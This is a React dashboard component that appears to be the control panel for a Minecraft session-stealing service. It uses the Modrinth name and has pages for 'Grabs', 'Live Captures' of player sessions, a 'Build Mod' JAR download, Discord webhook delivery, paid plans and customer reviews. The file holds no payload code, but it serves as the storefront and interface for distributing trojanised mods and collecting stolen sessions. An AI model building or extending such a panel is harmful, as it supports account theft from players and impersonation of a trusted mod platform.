'use client';

import { useState } from 'react';

const colors = {
  bg: '#0a0a0f',
  panel: '#111218',
  border: '#1e1f28',
  text: '#ffffff',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '9px 14px', borderRadius: 8,
      background: active ? '#1a1b24' : 'transparent',
      color: active ? colors.text : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}>
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function Dashboard() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Good evening, bnn.</h1>
      <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 24 }}>Your workspace is ready.</p>
      <div style={{ display: 'flex', gap: 14, marginBottom: 24 }}>
        {[
          { icon: '👤', label: 'USERS', value: '0', sub: 'No users yet' },
          { icon: '💬', label: 'CONNECTIONS', value: '0', sub: 'Connected with nobody' },
          { icon: '🌐', label: 'HITS', value: '0', sub: '0 total entries' },
        ].map((c, i) => (
          <div key={i} style={{ background: colors.panel, borderRadius: 10, padding: '18px 20px', flex: 1, border: `1px solid ${colors.border}` }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: colors.textDim, fontSize: 12, marginBottom: 10 }}>
              <span style={{ fontSize: 14 }}>{c.icon}</span> {c.label}
            </div>
            <div style={{ fontSize: 28, fontWeight: 700, color: colors.text }}>{c.value}</div>
            <div style={{ fontSize: 12, color: colors.textDim, marginTop: 4 }}>{c.sub}</div>
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', gap: 14 }}>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
            <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Recent Captures</span>
            <span style={{ fontSize: 12, color: colors.textDim, cursor: 'pointer' }}>View all →</span>
          </div>
          <div style={{ height: 160, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
            <span style={{ fontSize: 13 }}>No captures yet</span>
          </div>
        </div>
        <div style={{ width: 240 }}>
          <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>Top Servers</div>
          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 20, color: colors.textDim, fontSize: 13 }}>No servers yet</div>
        </div>
      </div>
    </div>
  );
}

function Grabs() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Grabs</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>All captured sessions will appear here.</p>
      <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
        <span style={{ fontSize: 28, marginBottom: 8 }}>📭</span>
        <span style={{ fontSize: 13 }}>No grabs yet</span>
      </div>
    </div>
  );
}

function Build() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>
      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
          <span>🔨</span> Build Mod
        </div>
        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>VERSION</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
          <div style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 16px', fontSize: 14, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
            Fabric 1.21.11
            <span style={{ background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '2px 6px', borderRadius: 4 }}>LATEST</span>
          </div>
        </div>
        <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 8 }}>
          <span>🔨</span> Rebuild JAR
        </button>
      </div>
      <div>
        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>YOUR MODS</div>
        <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: '14px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <span style={{ fontSize: 20 }}>📄</span>
            <div>
              <div style={{ fontSize: 14, fontWeight: 500, color: colors.text }}>fabric-1.21.11.jar</div>
              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>May 25, 2026 · 16.0 MB</div>
            </div>
          </div>
          <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '8px 16px', borderRadius: 8, fontSize: 13, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}>
            <span>↓</span> Download
          </button>
        </div>
      </div>
    </div>
  );
}

function Plans() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Plans</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Upgrade to unlock more features.</p>
      <div style={{ display: 'flex', gap: 16, maxWidth: 700 }}>
        <div style={{ flex: 1, background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: 28 }}>
          <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, marginBottom: 6 }}>FREE</div>
          <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$0</div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ forever</div>
          {['5 grabs per day', 'Basic profile lookup', 'Discord webhook'].map((f, i) => (
            <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
              <span style={{ color: colors.green }}>✓</span> {f}
            </div>
          ))}
        </div>
        <div style={{ flex: 1, background: colors.panel, border: `1px solid ${colors.green}`, borderRadius: 12, padding: 28, position: 'relative' }}>
          <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
          <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
          <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$9.99</div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ month</div>
          {['Unlimited sessions', 'Permanent data retention', 'Webhook notifications', 'Auth Mods & Builds', 'Priority support'].map((f, i) => (
            <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
              <span style={{ color: colors.green }}>✓</span> {f}
            </div>
          ))}
          <button disabled style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
        </div>
      </div>
    </div>
  );
}

function RepPage() {
  const reviews = [
    { user: 'tp67676767', tag: 'Good', time: 'Posted yesterday', text: 'work perfect' },
    { user: 'shxzlol_1', tag: 'Good', time: 'Posted yesterday', text: 'Really good' },
  ];
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 20 }}>
        <div>
          <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>+Rep</h1>
          <p style={{ color: colors.textDim, fontSize: 14, margin: 0 }}>5 reviews from users.</p>
        </div>
        <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '8px 16px', borderRadius: 8, fontSize: 13, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}>
          <span>✏️</span> Edit your +Rep
        </button>
      </div>
      <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
        {['Newest', 'Oldest', 'Good', 'Bad', 'Mine'].map((f, i) => (
          <button key={i} style={{ background: i === 0 ? colors.text : 'transparent', color: i === 0 ? colors.bg : colors.textDim, border: 'none', padding: '6px 14px', borderRadius: 6, fontSize: 13, cursor: 'pointer', fontWeight: 500 }}>{f}</button>
        ))}
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {reviews.map((r, i) => (
          <div key={i} style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: '16px 20px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
              <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{r.user}</span>
              <span style={{ background: '#1a2a1a', color: colors.green, fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>👍 {r.tag}</span>
              <span style={{ fontSize: 12, color: colors.textDim, marginLeft: 'auto' }}>{r.time}</span>
            </div>
            <p style={{ fontSize: 14, color: colors.text, margin: 0 }}>{r.text}</p>
          </div>
        ))}
      </div>
    </div>
  );
}

function LiveCaptures() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Live Captures</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Real-time session captures from your servers.</p>
      <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
        <span style={{ fontSize: 28, marginBottom: 8 }}>📡</span>
        <span style={{ fontSize: 13 }}>No live captures</span>
      </div>
    </div>
  );
}

export default function DashboardPage() {
  const [page, setPage] = useState('dashboard');
  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
          <NavItem icon="⚡" label="Grabs" active={page === 'grabs'} onClick={() => setPage('grabs')} />
          <NavItem icon="🔨" label="Build" active={page === 'build'} onClick={() => setPage('build')} />
          <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
          <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
          <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" />
          <NavItem icon="🚪" label="Log out" />
        </div>
      </aside>
      {page === 'dashboard' && <Dashboard />}
      {page === 'grabs' && <Grabs />}
      {page === 'build' && <Build />}
      {page === 'plans' && <Plans />}
      {page === 'rep' && <RepPage />}
      {page === 'live' && <LiveCaptures />}
    </div>
  );
}
